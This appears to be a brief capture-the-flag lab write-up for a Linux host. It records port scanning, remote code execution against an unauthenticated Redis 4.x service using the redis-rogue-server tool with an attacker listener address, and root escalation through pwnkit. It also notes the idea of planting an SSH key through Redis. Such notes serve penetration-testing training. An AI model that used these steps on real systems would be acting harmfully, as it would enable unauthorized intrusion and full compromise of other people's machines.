### Enumeration
```
IP=192.168.158.176
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p22,6379 -A $IP
```
#### Ports 
- 22
	- OpenSSH 8.3p1 Ubuntu 1ubuntu0.1 (Ubuntu Linux; protocol 2.0)
- 6379
	- Redis key-value store 4.0.14
- OS: Linux
### Foothold
- 6379
	- 4.x unauthenticated RCE MSF
	- https://github.com/n0b0dyCN/redis-rogue-server
		- Gives us rce
		- ./redis-rogue-server.py --rhost $IP --lhost 192.168.45.195
		- r

### PE
#### Linux
- prudence
	- id
		- uid=1001(prudence) gid=1001(prudence) groups=1001(prudence)
	- sudo -l
		- (root) NOPASSWD: /usr/local/bin/redis-status
			- running it asking for an authorization key
	- uname -a
		- `Linux blackgate 5.8.0-63-generic #71-Ubuntu SMP Tue Jul 13 15:59:12 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux`
	- getcap -r / 2>/dev/null
		- nothing
	- suid
		- find / -type f -perm -04000 -ls 2>/dev/null
	- linpeas
		- pwnkit
			- rooted
	- User directory
		- notes.txt
			- protected mode is off
				- https://medium.com/r3d-buck3t/unauthorized-access-via-redis-memory-space-d716e3c6ffad
				- Maybe put our own ssh key in root
### Lessons Learned